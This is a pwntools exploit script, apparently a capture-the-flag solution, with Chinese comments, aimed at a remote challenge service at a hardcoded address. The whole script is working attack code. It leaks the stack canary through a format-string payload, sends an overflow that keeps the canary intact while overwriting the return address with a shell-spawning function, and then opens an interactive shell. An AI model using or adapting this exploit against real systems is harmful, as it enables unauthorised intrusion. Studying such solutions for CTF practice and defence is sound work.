
from pwn import *
 
getshell0 = 0x405524
sh=remote("61.147.171.105",52340)
 
#sh = remote('111.198.29.45',55316)
 
def create():
   sh.sendlineafter('Your Choice :','1')
   sh.sendlineafter('size:','256')
   sh.sendlineafter('rabbit info :','a')
 
def show():
   sh.sendlineafter('Your Choice :','4')
   sh.sendlineafter('idx:','0')
 
sh.sendline('zhaohai')
#发送这个，才能显示出菜单
sh.sendline('a'*0x4 + '\x00\x00\x00\x0C\x00\x00\x00\x05')
 
#格式化字符串漏洞泄露canary
payload = 'S%12$p'
sh.sendlineafter('Your Choice :','6')
sh.sendlineafter('you can name the rabbit hole.',payload)
 
create()
show()
sh.recvuntil('S')
canary = int(sh.recvuntil('\n',drop = True),16)
print ('canary=',hex(canary))
payload = 'a'*0x8 + p64(canary) + p64(0) + p64(getshell0)
sh.sendlineafter('Your Choice :','6')
sh.sendlineafter('you can name the rabbit hole.',payload)
#getshell
sh.sendlineafter('Your Choice :','5')
 
sh.interactive()